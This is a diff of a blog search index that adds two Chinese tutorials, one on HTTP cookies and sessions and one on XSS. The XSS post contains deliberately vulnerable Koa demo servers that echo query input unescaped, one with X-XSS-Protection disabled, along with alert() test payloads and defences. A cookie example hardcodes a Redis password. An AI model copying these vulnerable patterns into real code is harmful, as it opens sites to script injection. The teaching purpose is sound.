@@ -4,6 +4,93 @@
   
     
     <entry>
+      <title><![CDATA[来一块饼干吗？ - HTTP Cookie]]></title>
+      <url>https://lucius0.github.io/2019/07/21/archivers/http-cookie/</url>
+      <content type="html"><![CDATA[<p>在阅读该文章之前，建议对 HTTP 有所了解，可以看<a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">HTTP 入门体检</a>，会对以下的内容有所帮助。</p>
+<p>我们在前面说了那么多关于 Web 安全的问题，多多少少都会跟 Cookies 扯上关系。也就是说无论是 <a href="https://lucius0.github.io/2019/06/30/archivers/web-secure-xss/">XSS</a> 还是 <a href="https://lucius0.github.io/2019/07/01/archivers/web-secure-csrf/">CSRF</a>，Cookies 都是我们无法绕过的坎。既然 Cookies 这么重要，那我们来好好的分析一下它。</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
+<p>Cookies 它是前端数据的<strong>“数据库”</strong>，保存在浏览器，且遵守<strong>同源策略</strong>。它是由服务器通过设置 <strong>HTTP 响应头</strong>来设置 Cookies，然后在请求的时候由浏览器通过 <strong>HTTP 请求头</strong>发送给服务器。一般情况下，<strong>JS 可读写Cookies</strong>。</p>
+</blockquote>
+<p>所谓的同源策略，指的是从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互，这样可以隔离潜在恶意文件。<strong>简单来说，就是协议、端口以及域名(无论一级域名或二级域名)相同构成同源地址。</strong> ——— <a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">同源策略 - MDN</a> </p>
+<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>其实属性我们在 <a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">网络协议入门体检</a>已经说过了，在这里我们重新梳理一次。之前也讲过在 koa2 的设置方法，koa 2 中操作 Cookies 是使用了<a href="https://github.com/pillarjs/cookies" target="_blank" rel="noopener">Cookies</a>，因此使用方法也简单了不少：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ctx.cookies.set([cookie_key], [cookie_value], &#123; 属性: 值 &#125;;</span></span><br><span class="line"><span class="comment">// 如：</span></span><br><span class="line">ctx.cookies.set(<span class="string">'uid'</span>, <span class="string">'123'</span>, &#123; <span class="attr">httpOnly</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure>
+<p>那么在第一次响应时会返回 <code>Set-Cookie</code> 响应首部字段。</p>
+<p><img src="/images/http/cookie-01.png" alt=""></p>
+<p>而再次发送该请求时，就会自动带上 <code>Cookie</code> 请求首部字段了。</p>
+<p><img src="/images/http/cookie-02.png" alt=""></p>
+<p><strong>注：</strong></p>
+<blockquote>
+<p>Cookies 是可以设置多个 key，value 键值对的。假如是同一个key，多个value，则在第二次请求的时候携带的 Cookie 首部字段是后者覆盖前者。</p>
+<p>我们已经知道了如何如增改查一个 Cookie，但是 Cookie 的删除却是无法直接删除的，什么意思呢？简单的说，你只能设置它的有效时间为过期时间，即 <code>ctx.cookies.set(&#39;uid&#39;,&#39;&#39;,{ maxAge:0 })</code>。</p>
+</blockquote>
+<h3 id="max-age-expires"><a href="#max-age-expires" class="headerlink" title="max-age/expires"></a>max-age/expires</h3><p>过期时间，这个不用多解释，跟之前讲的 <code>Cache-Control</code> 是一个使用方法以及效果一样。</p>
+<h3 id="Secure"><a href="#Secure" class="headerlink" title="Secure"></a>Secure</h3><p>只允许在 HTTPS 协议下请求传输。</p>
+<h3 id="HttpOnly"><a href="#HttpOnly" class="headerlink" title="HttpOnly"></a>HttpOnly</h3><p>不允许使用 js 来操作 Cookies，也就是只允许服务器操作，包括增删改查，该属性可以在一定程度上防御 CSRF 攻击，详细可以查看 <a href="https://lucius0.github.io/2019/07/01/archivers/web-secure-csrf/">CSRF</a>。</p>
+<h3 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h3><p>由于 Cookies 有域名访问权限设定，也就是说该 Cookie 只能在当前域使用，例如在百度的 Cookies 只能在 <code>baidu.com</code> 域名下允许访问。那么假如是二级域名呢？如 <code>test.baidu.com</code>。其实二级域名是<strong>有办法共享</strong>一级域名的 Cookies 的，就是通过 <code>domain</code> 来实现的。</p>
+<p><code>domain</code> 的默认值为哪个域名访问则为哪个，不管你是几级域名。因此二级域名的访问的 <code>domain</code> 就为二级域名，如 <code>xxx.baidu.com</code>，既然 <code>domain</code> 是二级域名，那么就无法跟一级域名共享 Cookie，而且一级域名的<code>domain</code> 也无法设置成二级域名。<strong>所以要实现共享，只需要将一级域名以及二级域名均设置为一级域名.</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一级域名设置如下</span></span><br><span class="line">ctx.cookies.set(<span class="string">'uid'</span>, <span class="string">'123'</span>, &#123; <span class="attr">domain</span>: <span class="string">'baidu.com'</span> &#125;);</span><br><span class="line"><span class="comment">// 二级域名设置如下</span></span><br><span class="line">ctx.cookies.set(<span class="string">'uid'</span>, <span class="string">'123'</span>, &#123; <span class="attr">domain</span>: <span class="string">'baidu.com'</span> &#125;);</span><br></pre></td></tr></table></figure>
+<h3 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h3><p>禁止第三方网站带 Cookies，即在响应头 <code>Set-Cookie</code> 设置 SameSite 属性，表示该 Cookies 问同源网站而非来源第三方网站。如 Koa2 设置如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.cookies.set([cookie_key], [cookie_value], &#123;<span class="attr">sameSite</span>: <span class="string">'strict'</span> | <span class="string">'lax'</span>&#125;;</span><br></pre></td></tr></table></figure>
+<p>其中 <code>strict</code> 与 <code>lax</code> 区别如下：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// B网站 API 响应头设置如下：</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: foo=<span class="number">1</span>; Samesite=Strict</span><br><span class="line"><span class="built_in">Set</span>-Cookie: bar=<span class="number">2</span>; Samesite=Lax</span><br><span class="line"><span class="built_in">Set</span>-Cookie: baz=<span class="number">3</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>假如在 A网站 请求 B网站 的 API，那么 <code>foo=1</code> 这个 Cookie 是不会从 A网站 带到 B网站的；</li>
+<li><code>Lax</code>，只会在使用危险 HTTP 方法时发送跨域 Cookie 被阻止，如 POST 请求。假如 A 网站 有一个超链接 GET 请求 B网站的 API，那么这时候 Cookie 是可以从 A网站 带到 B网站的；</li>
+<li><code>baz=3</code> 是可以从 A网站 带到 B网站；</li>
+</ol>
+<p><strong>注：</strong></p>
+<blockquote>
+<p>Lax 的防范有限，而 Strict 则一棒子打死，所以先对大多数 Cookie 设置为 Lax 作为 CSRF 攻击缓解措施，而针对某部分认为存在危险可能的 Cookie才设置 Strict。另外，SameSite Cookie 在子域不支持共享，也就是说父域登录后在子域还需要重新登录，这显然不够友好，而且还存在<strong>兼容性</strong>问题。</p>
+</blockquote>
+<h2 id="常见作用"><a href="#常见作用" class="headerlink" title="常见作用"></a>常见作用</h2><ul>
+<li>存储用户凭证，典型的有记住用户登录状态以及登录失效时间；</li>
+<li>存储业务数据，典型的有购物车物品的状态；</li>
+<li>记录用户习惯，典型的有在搜索物品后，会根据该记录给你精准推送；</li>
+<li>存储未登录用户的状态，典型的有论坛评论，填写你的邮箱地址然后进行评论，而且你不需要注册；</li>
+</ul>
+<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><ul>
+<li>Cookies 作为客户端的数据库，那么敏感信息保存在客户端多多少少是不安全的，万一被拦截了呢？上 HTTPS；</li>
+<li>Cookies 的存储容量有限，在不同浏览器都是有不同的限制，但大多数浏览器每个<strong>域</strong>不超过50个 Cookie 且不超过4kb，也有的浏览器则是每个 Cookie 的大小不超过 4kb，详细可以查看 <a href="http://browsercookielimits.squawky.net/" target="_blank" rel="noopener">Browser Cookie Limits</a>；</li>
+</ul>
+<h2 id="Cookies-与安全"><a href="#Cookies-与安全" class="headerlink" title="Cookies 与安全"></a>Cookies 与安全</h2><h3 id="Cookies-amp-amp-XSS"><a href="#Cookies-amp-amp-XSS" class="headerlink" title="Cookies &amp;&amp; XSS"></a>Cookies &amp;&amp; XSS</h3><p>假如 Cookies 在允许 JS 操作的情况下，那么 XSS 可以偷取 Cookie，解决方法也已经在前面提到了，就是使用 <code>httpOnly</code>。</p>
+<h3 id="Cookies-amp-amp-CSRF"><a href="#Cookies-amp-amp-CSRF" class="headerlink" title="Cookies &amp;&amp; CSRF"></a>Cookies &amp;&amp; CSRF</h3><p>CSRF 攻击的来源就是利用了 Cookies，当用户向目标网站发起请求的时候，这时候是会带上 Cookies 的。虽然带上了 Cookies，但是 CSRF 攻击网站是无法读写 Cookies 的。当然，我们最好的方法是能禁止不在白名单的第三方网站访问 Cookies，与防御 CSRF 攻击有关的 Cookies 属性是<code>sameSite</code>。</p>
+<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>这里作为补充知识点，因为很多时候都会听到 Cookies 以及 Session 一起讲，那 Cookies 是什么我们现在知道了。Session 又是什么呢？它跟 Cookies 的区别又是什么？欢迎走入今日扯淡。</p>
+<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><blockquote>
+<p>Session 本身就是一个抽象的概念，也就是因为 HTTP 的无状态，为了绕开 Cookies 的限制，借助客户端存储(一般来说是Cookies，因为较为通用)和服务器的存储，来实现客户端与服务器之间的中断和继续等操作的一种更高级的会话实现。</p>
+</blockquote>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>流程图如下：</p>
+<p><img src="/images/http/session-01.png" alt=""></p>
+<p>简单的实现<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> Redis = <span class="built_in">require</span>(<span class="string">"ioredis"</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">"koa-session2"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">const</span> redisCfg = &#123;</span><br><span class="line">  port: <span class="number">6379</span>, <span class="comment">// Redis port</span></span><br><span class="line">  host: <span class="string">"127.0.0.1"</span>, <span class="comment">// Redis host</span></span><br><span class="line">  family: <span class="number">4</span>, <span class="comment">// 4 (IPv4) or 6 (IPv6)</span></span><br><span class="line">  password: <span class="string">"admin"</span>,</span><br><span class="line">  db: <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisStore</span> <span class="keyword">extends</span> <span class="title">session</span>.<span class="title">Store</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>.redis = <span class="keyword">new</span> Redis(redisCfg);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">async</span> get(sessionId, ctx) &#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">await</span> <span class="keyword">this</span>.redis.get(<span class="string">`SESSION:<span class="subst">$&#123;sessionId&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(data);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">async</span> set(session, content, ctx) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; sessionId, maxAge &#125; = content;</span><br><span class="line">    <span class="keyword">const</span> key = <span class="string">`SESSION:<span class="subst">$&#123;sessionId&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">const</span> value = <span class="built_in">JSON</span>.stringify(session);</span><br><span class="line">    <span class="keyword">const</span> command = <span class="string">'EX'</span>;</span><br><span class="line">    maxAge = maxAge / <span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">this</span>.redis.set(key, value, command, maxAge);</span><br><span class="line">    <span class="keyword">return</span> sessionId;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">async</span> destroy(sessionId, ctx) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="keyword">this</span>.redis.del(<span class="string">`SESSION:<span class="subst">$&#123;sessionId&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;</span><br><span class="line">  store: <span class="keyword">new</span> RedisStore(),</span><br><span class="line">  key: <span class="string">"SESSION_ID"</span>,</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p>
+<h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ul>
+<li>Cookies 是存放在客户端的，通常为浏览器，而 Session 则是存在服务器；</li>
+<li>Cookies 作为登录凭证容易遭受到 CSRF 攻击，而 Session 相对来说较为安全；</li>
+<li>Cookies 只能存储 ASCII 字符串，假如是对象，还得通过 <code>JSON.parse</code> 转换，而 Session 可以存储对象，读写方便；</li>
+<li>保管在服务器的 Session 对服务器的压力有影响，一旦并发访问多，则会占用很多资源，因此不敏感的数据可以考虑储存在 Cookies；</li>
+<li>Cookies 可以与子域共享，而 Session 则没有这个说法；</li>
+</ul>
+<p><strong>注：</strong></p>
+<blockquote>
+<p>假如浏览器把 Cookies 禁用了，那么可以通过 Session 来与服务器进行交互，具体的做法就是在请求 URL 后附加相关信息，如<code>http://test.com?sessionId=abc123xxx</code></p>
+</blockquote>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本上我们讲完了 Cookies 的基本属性、Cookies 与安全的联系以及跟Session 之间的关系。Cookies 能做到安全防御的措施其实是很有限的，也就是那几个属性<code>httpOnly/Secure/sameSite</code>，再者可以在 Cookies 上加签名或者密钥，这样可以在一定程度上防止被修改。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> http </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> http </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[来杯一点点 - HTTP 缓存]]></title>
       <url>https://lucius0.github.io/2019/07/13/archivers/http-cache/</url>
       <content type="html"><![CDATA[<p>在阅读该文章之前，建议对 HTTP 有所了解，可以看<a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">HTTP 入门体检</a>，会对以下的内容有所帮助。</p>
@@ -292,6 +379,127 @@
 <li><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html" target="_blank" rel="noopener">CSRF 攻击的应对之道</a></li>
 <li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF" target="_blank" rel="noopener">Cross-Site Request Forgery (CSRF) - OWASP</a>)</li>
 <li><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">浅谈CSRF攻击方式 - hyddd - 博客园</a></li>
+</ul>
+]]></content>
+      
+        <categories>
+            
+            <category> http </category>
+            
+            <category> web-secure </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> http </tag>
+            
+            <tag> web-secure </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Web 安全防御战 - 浅谈XSS]]></title>
+      <url>https://lucius0.github.io/2019/06/30/archivers/web-secure-xss/</url>
+      <content type="html"><![CDATA[<p>在进入 web 安全知识之前，建议对 HTTP 有所了解，可以看<a href="https://lucius0.github.io/2019/06/30/archivers/http-introduction/">HTTP 入门体检</a>，会对以下的内容有所帮助。</p>
+<h2 id="XSS-Cross-Site-Scripting"><a href="#XSS-Cross-Site-Scripting" class="headerlink" title="XSS(Cross Site Scripting)"></a>XSS(Cross Site Scripting)</h2><blockquote>
+<p>XSS，跨站脚本攻击。很常见的一种攻击方式，主要是通过<strong>脚本注入</strong>的方式进行攻击用户。通常有：反射型 XSS 、存储型 XSS和 DOM 型 XSS。——<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">跨站脚本 - 维基百科</a></p>
+</blockquote>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><blockquote>
+<p>反射型 XSS，为非持久型，可以把它想象成反射弧。从发起带有XSS脚本的请求，提交到服务端，服务端解析后响应随之返回浏览器，最后浏览器将其响应解析并执行。简单来说，一般都是由 URI 参数直接注入的攻击。</p>
+</blockquote>
+<p>我们用 Koa2 来模拟一下，以下是简单的示例代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`welcome: `</span> + ctx.query.xss);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p>
+<p>在下面我们可以看到，浏览器会报错，原因是现代浏览器都会有 XSS 拦截的保护机制(这并不代表因为浏览器帮我们做了而我们就可以忽略 XSS 的知识)。</p>
+<p><img src="/images/http/xss-01.gif" alt=""></p>
+<p>因此我们需要在服务器设置响应首部<code>X-XSS-Protection</code>。由于我们是要模拟 XSS ，所以我们先关闭 XSS 的保护 <code>ctx.set(&#39;X-XSS-Protection&#39;, 0)</code>，然后就可以看到以下结果，弹出 alert 弹窗。</p>
+<p><img src="/images/http/xss-02.gif" alt=""></p>
+<p>除了上面直接执行脚本之外，还可以加载非同源的js文件，嵌入 iframe 页面等等。</p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
+<p> 存储型 XSS，为持久型。跟反射型 XSS 的唯一区别在于是否会保存在服务器，如数据库，内存等。而当别人访问该页面时，就会受到 XSS 代码的攻击。危害相比反射型更加严重，也更隐匿。</p>
+</blockquote>
+<p>我们再次用Koa2来模拟一下，以下是简单的示例代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset="UTF-8"&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Document&lt;/title&gt;</span></span><br><span class="line"><span class="string">  &lt;/head&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    #&#123;root&#125;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟数据库</span></span><br><span class="line"><span class="keyword">const</span> database = &#123;</span><br><span class="line">  message: <span class="string">''</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">async</span> ctx =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> url = ctx.request.url;</span><br><span class="line">  <span class="keyword">if</span> (url.indexOf(<span class="string">'/blog'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    database.message = ctx.query.message;</span><br><span class="line">    ctx.body = <span class="string">'发送成功～'</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.set(<span class="string">'X-XSS-Protection'</span>, <span class="number">0</span>);</span><br><span class="line">    ctx.body = template.replace(<span class="string">'#&#123;root&#125;'</span>, <span class="string">`来自某某人的消息：`</span> + database.message);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
+<p>大概的步骤是模拟类博客那种，黑客利用漏洞向网站发送带有 XSS 攻击脚本到服务器，服务器没有任何的安全校验直接保存到数据库 <code>database</code>，当其他用户访问带有该 XSS 脚本的页面时就被攻击了。在这里我们发送一个带用 iframe 劫持的请求到服务器，用户收到响应时就会返回该 iframe 页面。</p>
+<p><img src="/images/http/xss-03.gif" alt=""></p>
+<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><blockquote>
+<p>DOM 型 XSS，为非持久型，主要是利用前端的代码逻辑漏洞，攻击者植入恶意代码，然后浏览器解析恶意代码后执行造成的 XSS 攻击。</p>
+</blockquote>
+<p>以下是简单的示例代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  DOM 型 XSS</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  setTimeout(<span class="string">'alert(1)'</span>);</span></span><br><span class="line"><span class="javascript">  setInterval(<span class="string">'alert(2)'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="built_in">eval</span>(<span class="string">'alert(3)'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="常见-XSS-注入点"><a href="#常见-XSS-注入点" class="headerlink" title="常见 XSS 注入点"></a>常见 XSS 注入点</h3><ul>
+<li>HTML 节点内容，例如动态生成，里面包含用户输入信息，那么有可能会携带脚本；</li>
+<li>HTML 节点属性，例如图片的 onerror、onclick 事件；超链接 href、输入框 value 属性；</li>
+<li>JavaScript 代码，例如 JS 代码中存在后台注入的变量或如 react 的 dangerouslySetInnerHTML；</li>
+<li>富文本，例如富文本需要过滤需要正常展示的 html 代码之外的脚本；</li>
+</ul>
+<h3 id="常见危害"><a href="#常见危害" class="headerlink" title="常见危害"></a>常见危害</h3><ul>
+<li>获取页面数据；</li>
+<li>盗取 Cookie，获取敏感信息；</li>
+<li>劫持前端逻辑；</li>
+<li>伪装身份，利用可信任来进行不允许的操作；</li>
+<li>进行 DDoS 攻击；</li>
+<li>……</li>
+</ul>
+<h3 id="常见防御方法"><a href="#常见防御方法" class="headerlink" title="常见防御方法"></a>常见防御方法</h3><ul>
+<li>浏览器自带防御，如我们上面提到的，假如在服务器不设置<code>X-XSS-Protection</code>，现代浏览器也一样会为我们拦截大部分的 XSS 攻击(<strong>反射型 XSS，而且只会拦截出现在 HTML 内容或属性中，同时也并不是所有浏览器都支持</strong>)；</li>
+<li>节点内容转义，一般会在入数据库之前转义或者在展示的时候转义，但是入库之前转义需要<strong>注意的是，1、客户端不仅仅只有Web端，也有iOS等终端，所以可能会导致出现乱码；2、转义后的字符串跟长度跟预期的字符串长度发生变化，如’&lt;‘ 转成 ‘&lt;’，由1个字符变成了4个字符</strong>；</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 展示转义简单处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!str) <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">return</span> str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#x27;'</span>)</span><br><span class="line">           .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2F;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>JavaScript 内容转义，同理节点内容转义，但是处理方法稍微不同，可以使用<code>JSON.stringify</code>来处理；</li>
+<li>Angular / Vue / React，不建议使用 <code>[innerHTML]/v-html/dangerouslySetInnerHTML</code> 来插入 html 元素；</li>
+<li><code>eval()/setTimeout()/setInterval()</code>，都是可以直接将字符串当代码段运行；</li>
+<li>富文本内容转义，相对于节点内容转义跟 JavaScript 内容转义，富文本内容转义比较复杂，但是大多数处理的思路都是相同的，设置转义白名单，对用户输入的内容进行过滤，可以使用 <code>js-xss</code> 库；</li>
+<li>CSP(Content-Security-Policy)，可以参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">内容安全策略( CSP ) - HTTP | MDN</a>，后续会说明下CSP策略；</li>
+</ul>
